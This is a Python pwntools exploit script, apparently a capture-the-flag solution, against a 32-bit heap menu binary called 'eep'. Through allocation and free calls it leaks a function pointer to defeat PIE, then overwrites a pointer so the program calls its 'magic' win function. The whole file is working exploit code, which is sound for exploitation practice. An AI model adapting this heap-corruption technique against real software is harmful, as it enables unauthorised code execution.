#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './eep'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '10.107.0.10', 13370

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec eep 
#     Arch:     i386-32-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def create(size, data):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(size).encode())
    io.sendlineafter(b':', data)

def delete(idx):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(idx).encode())

def view(idx):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(idx).encode())

def exploit():
    global io
    io = initialize()

    create(0x8, b'AAAA')    
    create(0x10, b'BBBB')
    delete(0)
    delete(1)

    create(0x8, b'CCCC' + p32(0x0))
    delete(0)
    create(0x8, b'')

    view(2)
    io.recvuntil(b'Index :')
    elf.address = u32(io.recv(4).ljust(4, b'\x00')) - elf.sym['print_target_content']
    
    delete(2)
    create(0x8, p32(elf.sym['magic']))

    view(0) # trigger win

    log.info('win: %#x', elf.sym['magic'])
    log.info("elf base: %#x", elf.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()